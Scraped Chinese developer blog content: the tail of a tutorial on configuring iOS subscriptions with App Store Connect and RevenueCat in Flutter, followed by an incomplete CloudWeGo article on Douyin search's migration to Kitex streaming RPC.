<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fadmin.liuhaihua.cn%2Fwp-content%2Fuploads%2F2025%2F11%2F0cdf1502-d7d5-45a1-b168-6bbe25660dc7.png" target="_blank" title="https://admin.liuhaihua.cn/wp-content/uploads/2025/11/0cdf1502-d7d5-45a1-b168-6bbe25660dc7.png" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ec38bfbf2479409d8db495ca8c03b809~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSEJMT0c=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764307198&amp;x-signature=vl0GZyRiWxFn5lnkrJIKS1cn7mU%3D" alt="" loading="lazy"/></a></p>
<h3 data-id="heading-4">步骤 2：创建订阅组（Subscription Group）</h3>
<p>示例名称：</p>
<ul>
<li><strong>Linguadiary Pro</strong></li>
<li>或者 Pro Plan</li>
</ul>
<p><strong>注意：一个订阅组内，用户只能选择一个订阅（例如月付 or 年付）</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fadmin.liuhaihua.cn%2Fwp-content%2Fuploads%2F2025%2F11%2Fimage-15.png" target="_blank" title="https://admin.liuhaihua.cn/wp-content/uploads/2025/11/image-15.png" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e177abe2ac664fbdb7d8697337f94a07~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSEJMT0c=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764307198&amp;x-signature=W25kMxbJH1QGGuss50UuTSogpeM%3D" alt="" loading="lazy"/></a></p>
<h3 data-id="heading-5">步骤 3：创建订阅产品（In-App Purchase）</h3>
<p>例子：</p>
<p>字段</p>
<p>示例</p>
<p><strong>Reference Name</strong></p>
<p>Linguadiary Monthly Subscription</p>
<p><strong>Product ID</strong></p>
<p>linguadiary_monthly_1</p>
<p><strong>Duration</strong></p>
<p>1 Month</p>
<p><strong>Cleared for Sale</strong></p>
<p>YES</p>
<p><strong>Localization</strong></p>
<p>Title + Description 必填否则审核失败</p>
<p>Apple 要求填写：</p>
<h4 data-id="heading-6">（1）标题（Title）</h4>
<p>示例：</p>
<blockquote>
<p>Linguadiary Monthly Plan</p>
</blockquote>
<p>建议 35 字以内</p>
<h4 data-id="heading-7">（2）描述（Description）</h4>
<p>示例：</p>
<blockquote>
<p>Unlock unlimited AI correction and pro features.</p>
</blockquote>
<p>建议 55 字以内</p>
<h4 data-id="heading-8">（3）价格 / 价格计划（Pricing）</h4>
<p>选择 <strong>Level 1–87</strong> 价格等级。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fadmin.liuhaihua.cn%2Fwp-content%2Fuploads%2F2025%2F11%2F935743d6-6a12-4ee1-90dc-cc3334a7f34b.png" target="_blank" title="https://admin.liuhaihua.cn/wp-content/uploads/2025/11/935743d6-6a12-4ee1-90dc-cc3334a7f34b.png" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/520bdc7b888c4875bd726e5befd661aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSEJMT0c=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764307198&amp;x-signature=kPyHlNCH4OJw6SvhAuIoCSdG8uw%3D" alt="" loading="lazy"/></a></p>
<h3 data-id="heading-9">步骤 4：创建年订阅</h3>
<p>同组内再创建一个：</p>
<p>字段</p>
<p>示例</p>
<p>Product ID</p>
<p>linguadiary_yearly_12</p>
<p>Duration</p>
<p>1 Year</p>
<p>价格</p>
<p>Level 2–100</p>
<h2 data-id="heading-10">四、将订阅与 App 版本关联（最容易忘记的坑）</h2>
<h4 data-id="heading-11">必须进行两处绑定：</h4>
<h3 data-id="heading-12">1. “App 内购买项目”必须勾选订阅</h3>
<p>路径：</p>
<p><strong>App Store → Version → In-App Purchases → 选择你的订阅项目 → 保存</strong></p>
<p>否则会出现：</p>
<p>❌ “元数据丢失（Metadata Lost）”<br/>
❌ 无法通过审核<br/>
❌ RevenueCat 抓不到产品</p>
<h3 data-id="heading-13">2. 本地化语言必须在 “订阅组同级的 Localization” 填写</h3>
<p>路径：</p>
<pre><code class="hljs language-sql" lang="sql">App Store <span class="hljs-keyword">Connect</span> → App Information → Localization
</code></pre>
<p>必须填写：</p>
<ul>
<li>App Name</li>
<li>Subtitle</li>
<li>Description</li>
<li>Keywords</li>
<li>Support URL</li>
<li>Marketing URL</li>
</ul>
<p>缺少任何一个 → Apple 不让订阅上架 → RevenueCat 显示产品为空。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fadmin.liuhaihua.cn%2Fwp-content%2Fuploads%2F2025%2F11%2F74143867-8fc6-420e-940e-174891367f27.png" target="_blank" title="https://admin.liuhaihua.cn/wp-content/uploads/2025/11/74143867-8fc6-420e-940e-174891367f27.png" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/57eb77c31a3a40478759327d9215f18d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSEJMT0c=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764307198&amp;x-signature=iHrVlTgI0VOk5UU%2B3A1D4bOTR2c%3D" alt="" loading="lazy"/></a></p>
<h2 data-id="heading-14">五、在 RevenueCat 创建 Apple App</h2>
<p>路径：</p>
<pre><code class="hljs language-sql" lang="sql">RevenueCat → Apps <span class="hljs-operator">&amp;</span> providers→ <span class="hljs-keyword">Add</span> App → Apple App Store
</code></pre>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fadmin.liuhaihua.cn%2Fwp-content%2Fuploads%2F2025%2F11%2F5b3913e0-4af9-4e38-8b66-cd09eeb510ab.png" target="_blank" title="https://admin.liuhaihua.cn/wp-content/uploads/2025/11/5b3913e0-4af9-4e38-8b66-cd09eeb510ab.png" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/094b922772b0475797ee829e86049a10~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSEJMT0c=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764307198&amp;x-signature=Vbjh5ZqIE38c2%2BfjlDAt1tp1EFs%3D" alt="" loading="lazy"/></a></p>
<p>填写：</p>
<ul>
<li>App Name</li>
<li>Bundle ID（必须匹配 App Store Connect ）</li>
<li>Platform：iOS</li>
</ul>
<p>然后点击 <strong>Add Store</strong>。</p>
<h2 data-id="heading-15">六、在 RevenueCat 添加订阅产品</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fadmin.liuhaihua.cn%2Fwp-content%2Fuploads%2F2025%2F11%2Fe4402032-310d-439b-888e-e8428cc8c415.png" target="_blank" title="https://admin.liuhaihua.cn/wp-content/uploads/2025/11/e4402032-310d-439b-888e-e8428cc8c415.png" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fe2aef3e50e64dee821fd32dbdd9f7cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSEJMT0c=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764307198&amp;x-signature=Cmz8Tz2tAyx%2FygrL42xCqkwcMDo%3D" alt="" loading="lazy"/></a></p>
<p>路径：</p>
<pre><code class="hljs language-sql" lang="sql">Products → <span class="hljs-keyword">New</span> Product
</code></pre>
<p>添加：</p>
<ul>
<li>linguadiary_monthly_1</li>
<li>linguadiary_yearly_12</li>
</ul>
<p>必须与 App Store Connect Product ID 完全一致（大小写敏感）。</p>
<p>然后创建 Offering：</p>
<p>Offering</p>
<p>包含 Package</p>
<p><strong>default</strong></p>
<p>monthly + yearly</p>
<p>RevenueCat 会自动同步价格、商品信息。</p>
<h2 data-id="heading-16">七、在 App 内接入 RevenueCat SDK（Flutter 示例）</h2>
<h4 data-id="heading-17">1. 初始化 RevenueCat</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">await</span> Purchases.configure(
  PurchasesConfiguration(<span class="hljs-string">"public_sdk_key_ios"</span>),
);
</code></pre>
<h4 data-id="heading-18">2. 获取订阅产品</h4>
<pre><code class="hljs language-ini" lang="ini">final <span class="hljs-attr">offerings</span> = await Purchases.get<span class="hljs-literal">Off</span>erings()<span class="hljs-comment">;</span>
final <span class="hljs-attr">package</span> = <span class="hljs-literal">off</span>erings.current?.availablePackages.first<span class="hljs-comment">;</span>
</code></pre>
<h4 data-id="heading-19">3. 发起购买</h4>
<pre><code class="hljs language-go" lang="go">Purchases.purchasePackage(<span class="hljs-keyword">package</span>);
</code></pre>
<h4 data-id="heading-20">4. 判断用户是否为 Pro</h4>
<pre><code class="hljs language-ini" lang="ini">final <span class="hljs-attr">info</span> = await Purchases.getCustomerInfo()<span class="hljs-comment">;</span>
final <span class="hljs-attr">isPro</span> = info.entitlements.all[<span class="hljs-string">"pro"</span>]?.isActive ?? <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
</code></pre>
<p>仅以上 4 步即可完成全部逻辑。</p>
<h2 data-id="heading-21">八、测试订阅（Sandbox）</h2>
<h3 data-id="heading-22">添加 Sandbox 测试员</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fadmin.liuhaihua.cn%2Fwp-content%2Fuploads%2F2025%2F11%2F14268626-0906-496d-ac0b-30404d5cc4f8.png" target="_blank" title="https://admin.liuhaihua.cn/wp-content/uploads/2025/11/14268626-0906-496d-ac0b-30404d5cc4f8.png" ref="nofollow noopener noreferrer"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d686af6b9f194315aaf35bc487cd6859~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSEJMT0c=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764307198&amp;x-signature=t54ha0N8sai%2FvK9SiStf6na3Y0A%3D" alt="" loading="lazy"/></a></p>
<p>路径：</p>
<pre><code class="hljs">Users and Access → Sandbox Testers
</code></pre>
<p>填写：</p>
<ul>
<li>Email（不能是 Apple ID）</li>
<li>First/Last Name</li>
<li>Password</li>
</ul>
<p>测试流程：</p>
<ol>
<li>在设备登录 Sandbox Apple ID</li>
<li>安装 TestFlight 构建</li>
<li>购买订阅</li>
<li>Apple 会用虚拟价格扣费</li>
<li>生命周期会被加速：
<ul>
<li>Monthly → 5 min</li>
<li>Yearly → 1 hour</li>
</ul>
</li>
</ol>
<p>你可以快速看到：</p>
<ul>
<li>续费成功</li>
<li>失败 → Billing Retry</li>
<li>取消 → Expire</li>
</ul>
<h2 data-id="heading-23">九、常见坑与解决方案（踩坑大全）</h2>
<h3 data-id="heading-24">❌ 1. RevenueCat 无法读取产品</h3>
<p>原因：</p>
<ul>
<li>未上传订阅本地化（Title/Description）</li>
<li>Product 未添加到 App 版本</li>
<li>Subscription Group 未本地化</li>
<li>Price 未激活</li>
<li>Subscription 未提交审核</li>
</ul>
<h3 data-id="heading-25">❌ 2. App Store Connect 显示「元数据丢失」</h3>
<p>原因：</p>
<ul>
<li>你没有在 App Version 页面勾选订阅项目</li>
</ul>
<p>必须在这里添加：</p>
<pre><code class="hljs language-sql" lang="sql">App → Version → <span class="hljs-keyword">In</span><span class="hljs-operator">-</span>App Purchases → <span class="hljs-keyword">Add</span>
</code></pre>
<h3 data-id="heading-26">❌ 3. Apple 审核拒绝：缺少隐私政策/使用条款</h3>
<p>需要在 app 内提供：</p>
<ul>
<li>Privacy Policy 链接</li>
<li>Terms of Use / EULA 链接</li>
</ul>
<p>可用：</p>
<pre><code class="hljs language-arduino" lang="arduino">https:<span class="hljs-comment">//linguadiary.com/privacy</span>
https:<span class="hljs-comment">//linguadiary.com/terms</span>
</code></pre>
<h2 data-id="heading-27">十、发布到 App Store</h2>
<ol>
<li>确保订阅项目已 “Ready to Submit”</li>
<li>App 版本中已勾选订阅</li>
<li>提交审核</li>
<li>RevenueCat 自动处理所有验证流程</li>
<li>上架后订阅即可正常工作</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[企业级落地案例：抖音搜索核心链路基于 Kitex 流式改造的技术实践]]></title>    <link>https://juejin.cn/post/7574722364355362825</link>    <guid>https://juejin.cn/post/7574722364355362825</guid>    <pubDate>2025-11-21T05:26:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574722364355362825" data-draft-id="7574718964045152306" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="企业级落地案例：抖音搜索核心链路基于 Kitex 流式改造的技术实践"/> <meta itemprop="keywords" content="架构,人工智能,开源"/> <meta itemprop="datePublished" content="2025-11-21T05:26:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="CloudWeGo"/> <meta itemprop="url" content="https://juejin.cn/user/3998273922407624"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            企业级落地案例：抖音搜索核心链路基于 Kitex 流式改造的技术实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3998273922407624/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    CloudWeGo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T05:26:31.000Z" title="Fri Nov 21 2025 05:26:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>CloudWeGo 作为字节跳动开源的高性能微服务框架体系，核心组件 Kitex 中的流式架构设计，能够适配复杂业务的多次请求、分段返回需求，为亿级流量产品的链路优化提供了坚实基础。在抖音这样亿级用户的产品中，是如何落地实践并取得实效的呢？</p>
<p><strong>本文基于抖音搜索服务端架构研发工程师马永真在 CloudWeGo 四周年技术沙龙演讲内容整理，阐述抖音搜索核心链路如何借助 Kitex 流式能力进行技术改造，突破性能优化瓶颈，实现首屏体验与业务指标的双重提升。</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df906eac8b964d6fa3ae1c2bb6472478~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2xvdWRXZUdv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764307591&amp;x-signature=v7CkCD4JBFlB4hwCQj66Ids4ipQ%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">一、性能优化：业务背景、痛点与现有探索</h2>
<h3 data-id="heading-1">1. 搜索性能对业务的关键影响</h3>
<p>在抖音，搜索是连接内容、用户与信息的关键桥梁，其性能表现与核心业务指标紧密相连。行业研究表明，毫秒级的延迟都可能导致用户流失------例如，谷歌的数据显示，搜索速度每慢 400 毫秒，用户流失率便会增加 0.6%。抖音内部的性能劣化实验也同样证实，搜索性能的波动与用户的点击行为、搜索兴趣乃至商业指标之间存在强相关性。</p>
<h3 data-id="heading-2">2. 抖音搜索核心架构拆解</h3>
<p>抖音搜索的后端架构主要由两大核心模块构成：</p>
<ul>
<li>
<p><strong>引擎检索</strong>：作为接收用户请求的入口，这一层负责从海量的视频、用户等异构内容中召回初步相关的数据。随后召回的数百条初步结果，会在这里经过复杂的排序与筛选模型，精选出最匹配的十条结果。</p>
</li>
<li>
<p><strong>结果打包</strong>：这一层中系统会根据不同内容的特性，差异化地获取下游数据，并将其打包成适合客户端渲染的格式，最终通过 API 层呈现给用户。</p>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/16f04292bc514cccac17b7f85a34697a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2xvdWRXZUdv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764307591&amp;x-signature=8WzRTYkD71YQ7HUpDKHiZ%2BMg6Ls%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">3. 搜索业务的优化难点解析</h3>
<p>与推荐流等场景相比，搜索业务的性能优化面临着特殊瓶颈：</p>
<ul>
<li>
<p><strong>难以预取</strong>：推荐场景可以在用户浏览当前内容时，提前加载后续内容，而搜索行为具有瞬时性，无法进行有效的预取。搜索服务端架构团队曾尝试预取优化，但缓存命中率仅有约 10%，效果有限。</p>
</li>
<li>
<p><strong>用户行为的复杂性</strong>：搜索过程中，用户可能随时取消请求，这种不确定性与交互过程中的天然延迟，进一步加大了优化的难度。</p>
</li>
<li>
<p><strong>传统手段效果有限</strong>：在引擎检索层直接增加缓存的方案，虽然能提升速度，但却面临数据时效性的挑战，可能因返回过时结果而损害用户体验，得不偿失。</p>
</li>
</ul>
<h3 data-id="heading-4">4. 抖音搜索的业务特点与优化方向</h3>
<p>和传统搜索相比，抖音搜索有明显的独特性：早期百度、今日头条 PC 端等 WEB 搜索通常展示十条结果，今日头条 APP等咨询类 APP会展示三条左右结果，而抖音搜索以视频内容为主，单条结果的高度很高，用户首屏基本只能看到一条完整结果，下一条仅露出一点点。基于这个特点，搜索服务端架构团队把优化核心从"优化用户获取第一刷十条结果的速度"，调整为"优先优化用户首屏结果的呈现速度"。</p>
<h3 data-id="heading-5">5. 早期性能优化手段实践</h3>
<p>围绕"加速首屏"这一核心目标，抖音搜索服务端架构团队进行了一系列早期的技术探索：</p>
<ul>
<li>
<p><strong>首屏结果拆分：</strong> 用户发起搜索请求后，API 层接收引擎返回的结果，先计算铺满首屏需要 1-2 条数据，然后把打包请求拆成两次 ------ 第一次优先打包首屏数据并返回给 API 层，端上先展现首屏内容，剩余数据后续再返回，用户感知不到后续数据的加载，只觉得首屏数据很快拿到。
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c7afab4287304307aa74f71ce9c565ff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2xvdWRXZUdv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764307591&amp;x-signature=zauQ9Cbgxy3%2FV9LseeXqykksZD0%3D" alt="" loading="lazy"/></p>
</li>
<li>
<p><strong>首屏预测优化：</strong> 为了进一步缩短延迟，搜索服务端架构团队引入了预测机制。当用户请求到达 API 层时，系统会并行发起两次请求：一次是常规的在线引擎检索，另一次则是对缓存结果的召回。缓存数据同样会被拆分为首屏和非首屏两部分。然而，为了保证结果的准确性，客户端并不会立即展示缓存数据，而是等待在线检索结果返回。API 层会比对两者，若首屏内容一致，则向客户端发送"命中"信号，使其立即渲染首屏；若不一致，则放弃缓存，等待在线结果。这种"多次请求、多次返回"的交互模式，让搜索服务端架构团队在技术选型上倾向于采用 HTTP Chunked Transfer Encoding 流式返回数据，因为它既避免了独立请求带来的请求量翻倍问题，也规避了多次请求可能路由到不同实例的风险。
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/896c41388d4b400ab0013dd961519886~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2xvdWRXZUdv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764307591&amp;x-signature=P7CbxnqDjGvK3yIhbYbVC3aSJps%3D" alt="" loading="lazy"/></p>
</li>
<li>
<p><strong>自建打包优化：</strong> 把搜索结果拆成两部分：一部分是能够快速获取的静态元数据，如视频封面、标题文案、点赞评论数等，另一部分则是获取相对耗时的动态视频流数据。核心思路是先返回静态元数据，让用户迅速看到结果的框架，再加载视频流以供播放。然而，在缺少原生 RPC 流式支持的背景下，搜索服务端架构团队不得不采用一种变通方案：通过一次 RPC 调用触发两次独立的打包操作，并将动态视频流数据临时缓存在服务实例的内存中。第二次打包时，通过硬编码的 IP 地址去获取缓存数据。这种设计虽然在当时解决了问题，但无疑增加了架构的复杂性，并引入了潜在的稳定性风险------该方案强依赖服务实例的内存缓存，在实例发生重启或漂移时，存在数据丢失和获取失败的风险。
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/10efa075aba24fd5adc166f36981d7c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2xvdWRXZUdv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764307591&amp;x-signature=zdn9SJxS7Fj5SFEDSO%2FNCF6IQek%3D" alt="" loading="lazy"/></p>
</li>
</ul>
<h2 data-id="heading-6">二、技术改造：基于 Kitex 流式架构的核心链路重构</h2>
<h3 data-id="heading-7">1. 流式改造的核心动因与思路</h3>
<p>早期的自建打包方案虽然解决了部分问题，但其固有的架构复杂度和稳定性风险，成为了搜索服务端架构团队持续优化的障碍。随着字节跳动内部微服务框架 Kitex 对流式能力的支持日趋成熟，团队决定基于此进行一次彻底的链路重构。
核心思路十分明确：利用 Kitex 流式接口原生的 <strong>会话保持（Session Stickiness）能力</strong> ，将原方案的多次打包与多次请求，优化为 <strong>一次打包、单次连接、流式返回</strong> 的全新模式，从根本上简化架构，消除不稳定性。</p>
<h3 data-id="heading-8">2. 流式架构与传统架构的对比优势</h3>
<p>改造后的新旧架构对比如下，其优势显而易见：</p>
<ul>
<li>
<p><strong>架构更精简</strong>：API 层与 Loader 服务之间不再需要为获取缓存数据而发起二次请求，交互流程大幅简化。</p>
</li>
<li>
<p><strong>稳定性显著提升</strong>：请求量的减少直接降低了 Loader 服务的常驻内存占用。更重要的是，流式长连接确保了会话的稳定性，彻底解决了在服务发布或实例销毁时，因内存数据丢失而导致的二次打包失败问题。</p>
</li>
<li>
<p><strong>服务成功率显著提升</strong>：由于流式连接在会话期间会保持实例存活，老方案中"第二次打包数据获取失败"这一高频痛点被彻底根除，打包成功率得到大幅优化。</p>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d8f34518434e441c82bb7fcf3e55fda0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2xvdWRXZUdv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764307591&amp;x-signature=cSEuVpGIFccK5ASobctOXlva5BA%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-9">3. 开发体验与问题排查</h3>
<p>Kitex 流式能力不仅带来了架构上的收益，在开发和运维层面也提供了极大的便利。例如，框架提供的日志可以一键生成流式连接的全生命周期观测图，清晰地展示了服务何时发包、何时收包、何时断开，以及各环节的耗时分布，极大地提升了问题排查的效率。
在改造初期，搜索服务端架构团队曾遇到部分场景下无法收到第二次回包的问题。通过细致排查，最终定位为业务逻辑实现的一个 Bug------在数据尚未完全发送时，请求便意外断开。整个定位过程中因为框架继承了高效的trace能力很快就能对排查方向进行判断并且快速修复。</p>
<h3 data-id="heading-10">4. 流式与非流式协议的性能对比</h3>
<p>在真实业务场景中做了详细对比测试：</p>
<ul>
<li>
<p><strong>CPU 占用：</strong> 无论是客户端还是服务端，流式协议带来的额外 CPU 消耗与非流式场景基本持平，并未引入新的性能负担。</p>
</li>
<li>
<p><strong>RPC 耗时：</strong> 通过 AB 实验验证，流式接口的 P99 耗时劣化不超过 3 毫秒，完全在可接受的范围内。</p>
</li>
<li>
